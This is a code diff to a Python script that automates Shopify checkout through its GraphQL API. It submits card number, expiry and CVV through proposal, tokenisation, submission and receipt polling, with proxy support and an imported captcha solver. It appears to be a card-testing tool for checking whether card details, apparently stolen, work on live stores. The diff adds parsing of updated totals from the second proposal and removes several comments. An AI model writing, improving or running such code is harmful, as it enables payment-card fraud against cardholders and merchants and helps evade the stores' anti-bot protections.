@@ -10,7 +10,6 @@ import os
 import time
 
 # ─── Captcha Solver Integration ──────────────────────────────────────────────
-# Make sure captcha_solver.py is in the same directory
 try:
     from captcha_solver import solve_shopify_captcha, CaptchaResult
     CAPTCHA_SOLVER_AVAILABLE = True
@@ -682,7 +681,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'shippingScriptChanges': []
                     },
                     'optionalDuties': {'buyerRefusesDuties': False},
-                    'captcha': None,  # <-- Added for captcha support
+                    'captcha': None,
                 },
                 'operationName': 'Proposal'
             }
@@ -809,6 +808,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not payment_identifier:
                 return False, "No valid payment method found", gateway, total_price, currency
             
+            # --------------------------------------------------------------------
+            # SECOND PROPOSAL (delivery selection)
             json_data['query'] = QUERY_PROPOSAL_DELIVERY
             json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                 'deliveryStrategyByHandle': {
@@ -834,7 +835,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
-            # Ensure captcha is still None (will be set by handler if needed)
             json_data['variables']['captcha'] = None
 
             response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
@@ -845,6 +845,61 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if is_captcha_required(resp_text):
                 return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
 
+            # ----- FIX: Parse second proposal to get updated totals -----
+            if resp_json is None:
+                resp_json, parse_err = safe_json_parse(resp_text, "second proposal")
+                if resp_json is None:
+                    return False, parse_err, gateway, total_price, currency
+
+            try:
+                session_data = resp_json.get('data', {}).get('session')
+                if session_data is None:
+                    return False, "Session null in second proposal", gateway, total_price, currency
+                negotiate = session_data.get('negotiate')
+                if negotiate is None:
+                    return False, "Negotiate null in second proposal", gateway, total_price, currency
+                result = negotiate.get('result')
+                if result is None:
+                    return False, "Result null in second proposal", gateway, total_price, currency
+
+                seller_proposal_updated = result.get('sellerProposal')
+                if seller_proposal_updated is None:
+                    return False, "No sellerProposal in second proposal", gateway, total_price, currency
+
+                # Update running_total
+                running_total_data_updated = seller_proposal_updated.get('runningTotal')
+                if running_total_data_updated:
+                    running_total = running_total_data_updated['value']['amount']
+
+                # Update tax
+                tax_data_updated = seller_proposal_updated.get('tax', {})
+                if tax_data_updated and tax_data_updated.get('__typename') == 'FilledTaxTerms':
+                    tax_amount_data = tax_data_updated.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
+                    tax_amount = float(tax_amount_data)
+
+                # Update shipping amount (from delivery)
+                delivery_updated = seller_proposal_updated.get('delivery')
+                if delivery_updated and delivery_updated.get('__typename') == 'FilledDeliveryTerms':
+                    delivery_lines = delivery_updated.get('deliveryLines', [{}])
+                    if delivery_lines and len(delivery_lines) > 0:
+                        available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
+                        if available_strategies and len(available_strategies) > 0:
+                            # pick the first (or you can match by handle if needed)
+                            selected = available_strategies[0]
+                            shipping_amount_data = selected.get('amount', {}).get('value', {}).get('amount', '0')
+                            try:
+                                shipping_amount = float(shipping_amount_data)
+                            except:
+                                pass
+
+                # Also update currency and subtotal if they changed (rare)
+                # You can update `subtotal` from seller_proposal_updated.get('subtotalBeforeTaxesAndShipping') if needed.
+            except Exception as e:
+                print(f"[shopify] Failed to parse second proposal: {e}")
+                return False, f"Error parsing second proposal: {str(e)}", gateway, total_price, currency
+
+            # --------------------------------------------------------------
+            # Vault tokenisation (unchanged)
             payload = {
                 "credit_card": {
                     "number": cc,
@@ -909,6 +964,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception as e:
                 return False, f'Unable to get payment token: {str(e)[:200]}', gateway, total_price, currency
 
+            # --------------------------------------------------------------
+            # SUBMIT – using the updated running_total, tax, shipping
             params = {'operationName': 'SubmitForCompletion'}
             
             submit_variables = {
@@ -1024,7 +1081,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'localizationExtension': {'fields': []},
                     'nonNegotiableTerms': None,
                     'optionalDuties': {'buyerRefusesDuties': False},
-                    'captcha': None,  # <-- Added
+                    'captcha': None,
                 },
                 'attemptToken': attempt_token,
                 'metafields': [],
@@ -1119,6 +1176,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception as e:
                 return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
 
+            # ─── Polling ──────────────────────────────────────────────
             params = {'operationName': 'PollForReceipt'}
             poll_json_data = {
                 'query': QUERY_POLL,
